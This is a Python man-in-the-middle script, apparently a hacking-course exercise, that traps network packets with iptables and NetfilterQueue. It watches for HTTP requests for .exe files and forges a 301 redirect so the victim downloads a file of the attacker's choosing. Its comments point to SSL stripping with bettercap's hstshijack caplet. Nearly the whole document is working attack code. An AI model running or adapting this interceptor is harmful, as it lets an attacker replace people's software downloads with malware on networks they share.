#!/usr/bin/env python

import netfilterqueue
import subprocess
import optparse
import scapy.all as scapy

# only work with http
# https --> ssl strip, downgrade to http
# bettercap -iface eth0 -caplet hstshijack/hstshijack
# need to use modify_iptables_local
# dport/sport --> 8080

ack_list = []

def modify_iptables_remote(queue_num):
    # modify iptables to trap all packets in NetFilterQueue(0)
    # request from other computer --> FORWARD
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queue_num])

    print("[+] IPtables modified ... Remote packet trap in queue " + str(queue_num))

def modify_iptables_local(queue_num):
    # modify iptables to trap all packets in NetFilterQueue(0)
    # request from/to host computer --> OUTPUT/INPUT
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", queue_num])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", queue_num])

    print("[+] IPtables modified ... Local packet trap in queue " + str(queue_num))

def restore_iptables():
    subprocess.call(["iptables", "--flush"])
    print("[+] IPtables restored.")

def process_packet(packet):
    # convert to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    # http --> raw layer in scapy
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # if load in http request were to be modified --> TCP handshake needed
            if ".exe" in str(scapy_packet[scapy.Raw].load) and b"ip" not in scapy_packet[scapy.Raw].load:
                print("[+] Detected EXE Request.")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            # http response --> TCP handshake established
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                # http status code 2XX(suceess) --> 3XX(redirection)
                url = "https://www.rarlab.com/rar/winrar-x64-61b1.exe"
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + url + "\n\n")

                packet.set_payload(bytes(modified_packet))
    
    packet.accept()

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-n", "--queue_num", dest="queue_num", help="NFQueue number.")
    options, arguments = parser.parse_args()
    if not options.queue_num:
        parser.error("[-] Please specify a queue number, use --help for more info.")
    return options

options = get_arguments()
modify_iptables_local(options.queue_num)
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.queue_num), process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    restore_iptables()

# need to clear cache